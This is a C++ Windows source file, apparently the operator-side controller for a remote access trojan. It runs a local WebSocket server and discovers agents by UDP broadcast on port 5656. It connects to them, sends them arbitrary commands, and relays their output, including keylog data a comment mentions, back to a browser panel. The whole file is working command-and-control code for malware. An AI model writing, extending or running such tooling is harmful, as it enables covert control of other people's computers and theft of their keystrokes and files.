#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <sstream>
#include <algorithm>
#include <wincrypt.h>
#include <iomanip>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")

using namespace std;

SOCKET ratSocket = INVALID_SOCKET;
SOCKET webSocket = INVALID_SOCKET;
atomic<bool> isConnectedToRat(false);
atomic<bool> isWebConnected(false);
vector<string> discoveredServers;
mutex wsMutex;

// --- JSON ESCAPE (QUAN TRỌNG CHO KEYLOG & PATH) ---
string escapeJsonString(const string& input) {
    ostringstream ss;
    for (auto c : input) {
        switch (c) {
            case '"': ss << "\\\""; break;
            case '\\': ss << "\\\\"; break;
            case '\b': ss << "\\b"; break;
            case '\f': ss << "\\f"; break;
            case '\n': ss << "\\n"; break;
            case '\r': ss << "\\r"; break;
            case '\t': ss << "\\t"; break;
            default:
                if ('\x00' <= c && c <= '\x1f') {
                    ss << "\\u" << hex << setw(4) << setfill('0') << (int)c;
                } else {
                    ss << c;
                }
        }
    }
    return ss.str();
}

string base64_encode(const unsigned char* src, DWORD len) {
    DWORD destLen = 0;
    CryptBinaryToStringA(src, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &destLen);
    vector<char> dest(destLen);
    CryptBinaryToStringA(src, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, dest.data(), &destLen);
    return string(dest.data());
}

string computeAcceptKey(string clientKey) {
    string guid = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
    string combined = clientKey + guid;
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    DWORD hashLen = 20;
    BYTE hash[20];
    CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)combined.c_str(), combined.length(), 0);
    CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return base64_encode(hash, 20);
}

void sendWebFrame(string message) {
    lock_guard<mutex> lock(wsMutex);
    if (webSocket == INVALID_SOCKET || !isWebConnected) return;

    vector<unsigned char> frame;
    frame.push_back(0x81); // Text frame

    if (message.length() <= 125) {
        frame.push_back((unsigned char)message.length());
    } else if (message.length() <= 65535) {
        frame.push_back(126);
        frame.push_back((message.length() >> 8) & 0xFF);
        frame.push_back(message.length() & 0xFF);
    } else { // 64-bit support
        frame.push_back(127);
        unsigned long long len = message.length();
        for (int i = 7; i >= 0; i--) {
            frame.push_back((len >> (i * 8)) & 0xFF);
        }
    }

    frame.insert(frame.end(), message.begin(), message.end());
    send(webSocket, (char*)frame.data(), frame.size(), 0);
}

void sendRat(string msg) {
    if (ratSocket != INVALID_SOCKET && isConnectedToRat) {
        msg += "\n";
        send(ratSocket, msg.c_str(), msg.length(), 0);
    }
}

string receiveRatLine() {
    string result;
    char c;
    while (recv(ratSocket, &c, 1, 0) > 0) {
        if (c == '\n') break;
        if (c != '\r') result += c;
    }
    return result;
}

void handleDiscovery() {
    SOCKET udpSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    sockaddr_in recvAddr;
    recvAddr.sin_family = AF_INET;
    recvAddr.sin_port = htons(5656);
    recvAddr.sin_addr.s_addr = INADDR_ANY;
    int timeout = 1000;
    setsockopt(udpSock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

    if (bind(udpSock, (sockaddr*)&recvAddr, sizeof(recvAddr)) == 0) {
        char buf[1024];
        sockaddr_in sender;
        int senderLen = sizeof(sender);
        while (true) {
            int bytes = recvfrom(udpSock, buf, sizeof(buf) - 1, 0, (sockaddr*)&sender, &senderLen);
            if (bytes > 0) {
                buf[bytes] = '\0';
                string ip = inet_ntoa(sender.sin_addr);
                bool exists = false;
                for (const auto& s : discoveredServers) if (s == ip) exists = true;
                if (!exists) {
                    discoveredServers.push_back(ip);
                    if (isWebConnected) {
                        string json = "{\"type\":\"DISCOVERY\", \"ip\":\"" + ip + "\"}";
                        sendWebFrame(json);
                    }
                }
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    }
    closesocket(udpSock);
}

void ratReceiverThread() {
    while (isConnectedToRat) {
        string line = receiveRatLine();
        if (line.empty() && !isConnectedToRat) break;

        // Escape JSON để tránh lỗi cú pháp khi gặp ký tự đặc biệt
        string safeLine = escapeJsonString(line);
        string json = "{\"type\":\"LOG\", \"data\":\"" + safeLine + "\"}";
        sendWebFrame(json);
    }
}

void handleWebCommand(string cmd) {
    cout << "[Web Command] " << cmd << endl;
    size_t delimiter = cmd.find('|');
    string action = cmd.substr(0, delimiter);
    string data = (delimiter != string::npos) ? cmd.substr(delimiter + 1) : "";

    if (action == "CONNECT") {
        if (isConnectedToRat) {
            closesocket(ratSocket);
            isConnectedToRat = false;
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
        }
        ratSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        sockaddr_in addr;
        addr.sin_family = AF_INET;
        inet_pton(AF_INET, data.c_str(), &addr.sin_addr);
        addr.sin_port = htons(5656);

        if (connect(ratSocket, (sockaddr*)&addr, sizeof(addr)) == 0) {
            isConnectedToRat = true;
            sendWebFrame("{\"type\":\"STATUS\", \"connected\":true}");
            thread(ratReceiverThread).detach();
        } else {
            string msg = "{\"type\":\"ERROR\", \"msg\":\"Connection Failed: " + to_string(WSAGetLastError()) + "\"}";
            sendWebFrame(msg);
        }
    }
    else if (action == "DISCONNECT") {
        if (isConnectedToRat) {
            sendRat("QUIT");
            closesocket(ratSocket);
            isConnectedToRat = false;
        }
        sendWebFrame("{\"type\":\"STATUS\", \"connected\":false}");
    }
    else if (action == "CMD") {
        sendRat(data);
    }
    else if (action == "GET_SERVERS") {
        for (const auto& ip : discoveredServers) {
            string json = "{\"type\":\"DISCOVERY\", \"ip\":\"" + ip + "\"}";
            sendWebFrame(json);
        }
    }
}

void webSocketServer() {
    SOCKET listenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(8080);
    bind(listenSock, (sockaddr*)&addr, sizeof(addr));
    listen(listenSock, 1);
    cout << "Wrapper Proxy running on ws://localhost:8080" << endl;

    while (true) {
        SOCKET client = accept(listenSock, NULL, NULL);
        if (client == INVALID_SOCKET) continue;

        char buffer[1024];
        int n = recv(client, buffer, sizeof(buffer), 0);
        if (n > 0) {
            string req(buffer, n);
            size_t keyPos = req.find("Sec-WebSocket-Key: ");
            if (keyPos != string::npos) {
                string key = req.substr(keyPos + 19, 24);
                string acceptKey = computeAcceptKey(key);
                string response =
                    "HTTP/1.1 101 Switching Protocols\r\n"
                    "Upgrade: websocket\r\n"
                    "Connection: Upgrade\r\n"
                    "Sec-WebSocket-Accept: " + acceptKey + "\r\n\r\n";
                send(client, response.c_str(), response.length(), 0);

                {
                    lock_guard<mutex> lock(wsMutex);
                    webSocket = client;
                    isWebConnected = true;
                }
                cout << "Web Client Connected!" << endl;

                while (isWebConnected) {
                    unsigned char header[2];
                    int r = recv(client, (char*)header, 2, 0);
                    if (r <= 0) break;

                    bool masked = header[1] & 0x80;
                    int payloadLen = header[1] & 0x7F;
                    if (payloadLen == 126) {
                        unsigned char lenBytes[2];
                        recv(client, (char*)lenBytes, 2, 0);
                        payloadLen = (lenBytes[0] << 8) | lenBytes[1];
                    } else if (payloadLen == 127) { break; } // Ignore huge frames

                    unsigned char maskKey[4];
                    if (masked) recv(client, (char*)maskKey, 4, 0);
                    vector<char> payload(payloadLen);
                    
                    int received = 0;
                    while(received < payloadLen) {
                        int chunk = recv(client, payload.data() + received, payloadLen - received, 0);
                        if(chunk <= 0) break;
                        received += chunk;
                    }

                    if (masked) {
                        for (int i = 0; i < payloadLen; i++) payload[i] ^= maskKey[i % 4];
                    }
                    string msg(payload.begin(), payload.end());
                    handleWebCommand(msg);
                }
            }
        }
        {
            lock_guard<mutex> lock(wsMutex);
            isWebConnected = false;
            webSocket = INVALID_SOCKET;
        }
        closesocket(client);
        cout << "Web Client Disconnected" << endl;
    }
}

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    thread discoveryThread(handleDiscovery);
    discoveryThread.detach();
    webSocketServer();
    WSACleanup();
    return 0;
}